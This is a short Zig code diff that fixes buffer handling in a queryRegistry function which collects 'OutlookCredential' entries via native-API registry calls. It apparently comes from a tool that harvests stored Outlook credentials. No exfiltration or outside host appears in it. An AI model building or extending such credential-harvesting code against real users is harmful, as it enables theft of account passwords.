@@ -126,7 +126,6 @@ fn queryRegistry(allocator: std.mem.Allocator, out: *std.ArrayList(OutlookCreden
     if (status < 0) return;
     defer _ = engine.NtClose(key_handle);
 
-    var value_buf: [4096]u8 = undefined;
     var value_name = types.UNICODE_STRING{
         .Length = 0,
         .MaximumLength = 0,
@@ -134,20 +133,22 @@ fn queryRegistry(allocator: std.mem.Allocator, out: *std.ArrayList(OutlookCreden
     };
 
     var result_len: types.ULONG = 0;
-    var kvpi: types.KEY_VALUE_PARTIAL_INFORMATION = undefined;
+    var kvpi_buf: [256]u8 = undefined;
 
     const qv_status = engine.NtQueryValueKey(
         key_handle,
         &value_name,
         @as(types.ULONG, @intFromEnum(types.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation)),
-        @as(types.PVOID, @ptrCast(&kvpi)),
-        @as(types.ULONG, @intCast(@sizeOf(types.KEY_VALUE_PARTIAL_INFORMATION) + value_buf.len)),
+        @as(types.PVOID, @ptrCast(&kvpi_buf)),
+        @as(types.ULONG, @intCast(kvpi_buf.len)),
         &result_len,
     );
-    if (qv_status < 0 and qv_status != 0x80000005) return; // STATUS_BUFFER_OVERFLOW or STATUS_OBJECT_NAME_NOT_FOUND
+    if (qv_status < 0 and qv_status != 0x80000005) return; // STATUS_BUFFER_OVERFLOW (0x80000005) is excluded — buffer too small but data is valid
 
-    const data_len = @min(@as(usize, @intCast(kvpi.DataLength)), value_buf.len);
-    const data = value_buf[0..data_len];
+    const kvpi: *types.KEY_VALUE_PARTIAL_INFORMATION = @ptrCast(@alignCast(&kvpi_buf));
+    const data_offset = @offsetOf(types.KEY_VALUE_PARTIAL_INFORMATION, "Data");
+    const data_len = @min(@as(usize, @intCast(kvpi.DataLength)), kvpi_buf.len - data_offset);
+    const data = kvpi_buf[data_offset..][0..data_len];
 
     if (data.len == 0) return;
 
